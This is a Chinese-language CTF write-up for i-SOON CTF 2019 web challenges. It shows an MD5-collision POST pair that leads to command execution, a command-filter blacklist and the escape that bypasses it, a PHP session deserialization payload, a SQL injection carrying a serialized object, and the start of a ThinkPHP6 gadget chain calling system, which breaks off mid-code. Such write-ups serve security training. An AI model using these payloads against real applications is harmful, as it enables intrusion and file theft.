本文由 [@D0g3](https://www.d0g3.cn/about) 编写
i-SOON_CTF_2019 部分题目环境/源码  
> 广告一波:  
>  H1ve 是一款自研 CTF 平台，同时具备解题、攻防对抗模式。其中，解题赛部分对 Web 和 Pwn 题型，支持独立题目容器及动态 Flag
> 防作弊。攻防对抗赛部分支持 AWD 一键部署，并配备炫酷地可视化战况界面。  
>  该作品随着安洵杯比赛进程，逐步开源，敬请期待 [Github项目地址](https://github.com/D0g3-Lab/H1ve)
# Web
## easy_web
### 考点
  * 文件包含
  * md5碰撞
  * rce
  * fuzz
> 由于题目正则出现了点问题，最后一个 fuzz 的考点没有考到。导致很多队伍直接通过最简单的 Bypass 就可以拿到 flag。稍后在题解中详谈。
### 题解
观察 url 根据 url 中 img 参数 `img=TXpVek5UTTFNbVUzTURabE5qYz0` 推测文件包含  
加密脚本
    import binascii
    import base64
    filename = input().encode(encoding='utf-8')
    hex = binascii.b2a_hex(filename)
    base1 = base64.b64encode(hex)
    base2 = base64.b64encode(base1)
    print(base2.decode())
读取 index.php 源码之后审计源码。发现通过 rce 拿到 flag 之前需要通过一个判断  
`if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) ===
md5($_POST['b']))`
通过md5碰撞即可 rce 拿到 flag
    POST数据
    a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
    &b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
关于 rce 有一个过滤的黑名单如下，过滤了常见的读取文件的操作
    if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|/i", $cmd))
因为过滤了大多常见的文件读取的命令，最后的核心考点是拿 linux 命令去 fuzz ，但是因为过滤反斜杠 `|\\|\\\\|`
这里的时候正则没有写好，导致了反斜杠逃逸。因此造成了 `ca\t` 命令可以直接读取 flag
预期解也不唯一，毕竟很多命令都能读取文件内容。这里还是给出相对比较常见的一个。  
`sort`即可。  
## easy_serialize_php
### 考点
  * 变量覆盖
  * 预包含
  * 反序列化中的对象逃逸
### 题解
首先打开网页界面，看到source_code，点击就可以直接看到源码。
从上往下阅读代码，很明显的可以发现一个变量覆盖。至于这个覆盖怎么用，暂时还不知道，这是第一个考点。
往下看，可以看到我们可以令function为phpinfo来查看phpinfo，此时就可以看到我的第二个考点：
我在php.ini中设置了auto_prepend_file隐式包含了d0g3_f1ag.php，直接访问可以发现没有任何内容，说明我们需要读取这个文件的内容。
接着往下看代码，可以看到最终执行了一个`file_get_contents`，从这个函数逆推回去`$userinfo["img"]`的值，可以发现这个值虽然是我们可控的，但是会经过sha1加密，而我没有解密，导致无法读取任何文件。
此时需要把注意力转移到另外一个函数`serialize`上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，而这层过滤函数会干扰序列化后的数据。
> PS：任何具有一定结构的数据， **如果经过了某些处理而把结构体本身的结构给打乱了** ，则有可能会产生漏洞。
先放payload：
    _SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}&function=show_image
这里我令_SESSION[user]为flagflagflagflagflagflag，正常情况下序列化后的数据是这样的：
    a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}
而经过了过滤函数之后，序列化的数据就会变成这样：
    a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}
可以看到，user的内容长度依旧为24，但是已经没有内容了，所以反序列化时会自动往后读取24位：
会读取到上图的位置，然后结束，由于user的序列化内容读取数据时需要往后填充24位，导致后面function的内容也发生了改变，吞掉了其双引号，导致我们可以控制后面的序列化内容。
而php反序列化时，当一整段内容反序列化结束后，后面的非法字符将会被忽略，而如何判断是否结束呢，可以看到，前面有一个a:3，表示序列化的内容是一个数组，有三个键，而以{作为序列化内容的起点，}作为序列化内容的终点。
所以此时后面的`";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}`在反序列化时就会被当作非法字符忽略掉，导致我们可以控制$userinfo["img"]的值，达到任意文件读取的效果。
在读取完`d0g3_f1ag.php`后，得到下一个hint，获取到flag文件名，此时修改payload读根目录下的flag即可。
## 不是文件上传
### 考点
  * 信息泄漏
  * SQL注入
  * 反序列化
### 题解
**获取源码**
在主页的源码下方有一个开发人员留的信息，可知网站的源码已经被上传的github上面了。
而网站源码的名称就是网页页脚的wowouploadimage, github搜索这个名称，即可找到源码。
**SQL注入 = > 反序列化 => 读取Flag**
在图片上传处，check函数并未对文件名(title)进行检测, 直接传递到最后的SQL语句当中。导致了SQL注入，并且属于Insert注入。
审计代码后可知，图片数据在保存的时候，会将图片的高度和宽度进行序列化然后保存。在查看图片信息的页面(show.php)会对其进行反序列化。
我们需要通过SQL注入修改保存的信息中的序列化的值来利用。
在helper.php中的helper类中有一个`__destruct`魔术方法可以利用，通过调用`view_files`中的`file_get_contents`来读取flag。
**构造payload**
反序列化payload生成：
payload:
`O:6:"helper":2:{s:9:"*ifview";b:1;s:9:"*config";s:5:"/flag";}`
这里的属性值ifview和config都是protected类型的，所以需要将payload修改为：
`O:6:"helper":2:{s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";}`
(以至于为什么要将修改为\0\0\0，是因为源码中在存取过程中对protected类型的属性进行了处理。)
正常上传图片的sql语句为：
    INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('TIM截图20191102114857','f20c76cc4fb41838.jpg','jpg','pic/f20c76cc4fb41838.jpg','a:2:{s:5:"width";i:1264;s:6:"height";i:992;}')
由于title处是我们能够控制的，所以构造文件名如下：
    1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg
因为上传的文件名中不能有双引号，所以将payload进行16进制编码。
使用 Brupsuite 将上传的 filename 修改为构造的文件名上传，再访问 show.php 即可得到flag。
## iamthinking
### 考点
  * 反序列化
### 题解
通过在上级目录下发现www.zip  
审计源码，构造thinkphp6反序列化，同时需要绕过parse_url
EXP
    lazySave = true;
                $this->table = $obj;
                $this->visible = array(array('hu3sky'=>'aaa'));
                $this->relation = array("hu3sky"=>'aaa');
                $this->data = array("a"=>'cat /flag');
                $this->withAttr = array("a"=>"system");
            }
        }
    }
    namespace think\model\concern {
        trait Conversion
        {
            protected $visible;
        }